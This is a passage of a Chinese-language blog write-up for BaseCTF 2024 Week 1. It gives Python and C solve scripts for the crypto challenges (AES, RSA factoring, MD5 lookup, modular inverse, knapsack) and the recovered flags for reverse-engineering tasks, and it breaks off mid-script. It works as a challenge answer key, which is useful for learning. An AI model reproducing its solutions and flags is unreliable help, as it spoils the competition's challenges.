

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="Week1  Crypto  hello_crypto 12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 已知的 key1 和密文key1 &#x3D; 20879775995">
<meta property="og:type" content="article">
<meta property="og:title" content="Basectf2024">
<meta property="og:url" content="https://0ran9ewww.github.io/2024/08/21/basectf/basectf2024/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="Week1  Crypto  hello_crypto 12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 已知的 key1 和密文key1 &#x3D; 20879775995">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/images/basectf/basectf2024/back.jpg">
<meta property="article:published_time" content="2024-08-21T07:00:00.000Z">
<meta property="article:modified_time" content="2024-09-21T07:45:50.000Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/images/basectf/basectf2024/back.jpg">
  
  
  
  <title>Basectf2024 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/images/basectf/basectf2024/back.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Basectf2024"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-21 15:00" pubdate>
          2024年8月21日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          81 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Basectf2024</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2024年9月21日 下午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> Week1</h1>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="hello_crypto"><a class="markdownIt-Anchor" href="#hello_crypto"></a> hello_crypto</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import unpad<br><br><span class="hljs-comment"># 已知的 key1 和密文</span><br>key1 = 208797759953288399620324890930572736628<br>ciphertext = b<span class="hljs-string">&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><br><span class="hljs-comment"># 将 key1 转换为字节格式</span><br>key = long_to_bytes(key1)<br><br><span class="hljs-comment"># 创建 AES 解密器</span><br>my_aes = AES.new(<span class="hljs-attribute">key</span>=key, <span class="hljs-attribute">mode</span>=AES.MODE_ECB)<br><br><span class="hljs-comment"># 解密并去除填充</span><br>decrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br></code></pre></td></tr></table></figure>
<h3 id="ez_rsa"><a class="markdownIt-Anchor" href="#ez_rsa"></a> ez_rsa</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 已知的 n, not_phi 和 c</span><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Step 1: 从 n 和 not_phi 计算出 p 和 q</span><br><span class="hljs-comment"># p*q = n, (p+2)*(q+2) = not_phi</span><br><span class="hljs-comment"># 展开得到 pq + 2p + 2q + 4 = not_phi</span><br><span class="hljs-comment"># p + q = (not_phi - n - 4) / 2</span><br><br>s = (not_phi - n - <span class="hljs-number">4</span>) // <span class="hljs-number">2</span><br><span class="hljs-comment"># 使用求解二次方程的方法解出 p 和 q</span><br><span class="hljs-comment"># x^2 - sx + n = 0</span><br>discriminant = gmpy2.isqrt(s*s - <span class="hljs-number">4</span>*n)<br>p = (s + discriminant) // <span class="hljs-number">2</span><br>q = (s - discriminant) // <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Step 2: 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Step 3: 计算私钥 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># Step 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># Step 5: 将解密的数字转换为字符串</span><br>decrypted_message = long_to_bytes(m)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_message)<br></code></pre></td></tr></table></figure>
<h3 id="你会算md5吗"><a class="markdownIt-Anchor" href="#你会算md5吗"></a> 你会算md5吗</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># Helper function to compute MD5 hash of a string</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-comment"># Possible characters</span><br>possible_chars = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?/&quot;</span><br><br><span class="hljs-comment"># Given hashes</span><br>hashes = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,<br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,<br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><br><span class="hljs-comment"># Find corresponding characters</span><br>decoded_flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> hash_val <span class="hljs-keyword">in</span> hashes:<br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> possible_chars:<br>        <span class="hljs-keyword">if</span> md5_hash(char) == hash_val:<br>            decoded_flag += char<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        decoded_flag += <span class="hljs-string">&#x27;?&#x27;</span>  <span class="hljs-comment"># Use a placeholder if hash not found</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded flag: <span class="hljs-subst">&#123;decoded_flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<h3 id="十七倍"><a class="markdownIt-Anchor" href="#十七倍"></a> 十七倍</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<br>        <span class="hljs-number">98</span>, <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>, <span class="hljs-number">43</span>, <span class="hljs-number">9</span>, <span class="hljs-number">95</span>,<br>        <span class="hljs-number">165</span>, <span class="hljs-number">146</span>, <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>, <span class="hljs-number">48</span>, <span class="hljs-number">79</span>,<br>        <span class="hljs-number">65</span>, <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">46</span>, <span class="hljs-number">249</span>, <span class="hljs-number">78</span>, <span class="hljs-number">183</span>, <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>        <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>, <span class="hljs-number">79</span>, <span class="hljs-number">78</span>, <span class="hljs-number">48</span>, <span class="hljs-number">231</span>, <span class="hljs-number">77</span><br>    &#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[<span class="hljs-number">40</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inverse = <span class="hljs-number">241</span>;  <span class="hljs-comment">// 17&#x27;s modular inverse modulo 256</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        flag[i] = (cipher[i] * inverse) % <span class="hljs-number">256</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Print the decrypted flag</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted flag: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, flag[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<h3 id="babypack"><a class="markdownIt-Anchor" href="#babypack"></a> babypack</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 从文件中读取a和c的值</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\\谷歌\\babypack\\output.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    a = <span class="hljs-built_in">eval</span>(lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br>    c = <span class="hljs-built_in">int</span>(lines[<span class="hljs-number">1</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br><br>bin_m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> c &gt;= a[i]:<br>        bin_m.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        c -= a[i]<br>    <span class="hljs-keyword">else</span>:<br>        bin_m.append(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><span class="hljs-comment"># 将bin_m转换回整数m</span><br>m = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(bin_m), <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 将m转换回flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2>
<h3 id="you-are-good-at-ida"><a class="markdownIt-Anchor" href="#you-are-good-at-ida"></a> You are good at IDA</h3>
<p>按照shift和f12进行查找最后拼接就行了</p>
<p><strong>BaseCTF{Y0u_4Re_900d_47_id4}</strong></p>
<h3 id="upx-mini"><a class="markdownIt-Anchor" href="#upx-mini"></a> UPX mini</h3>
<p>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==</p>
<p>base64解密</p>
<p><strong>BaseCTF{Hav3_@_g0od_t1m3!!!}</strong></p>
<h3 id="ez_maze"><a class="markdownIt-Anchor" href="#ez_maze"></a> ez_maze</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">maze, start_pos, end_pos</span>):<br>    ROWS = <span class="hljs-built_in">len</span>(maze)<br>    COLS = <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>])<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">pos, direction</span>):<br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;d&#x27;</span>:  <span class="hljs-comment"># Right</span><br>            <span class="hljs-keyword">return</span> pos + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;s&#x27;</span>:  <span class="hljs-comment"># Down</span><br>            <span class="hljs-keyword">return</span> pos + 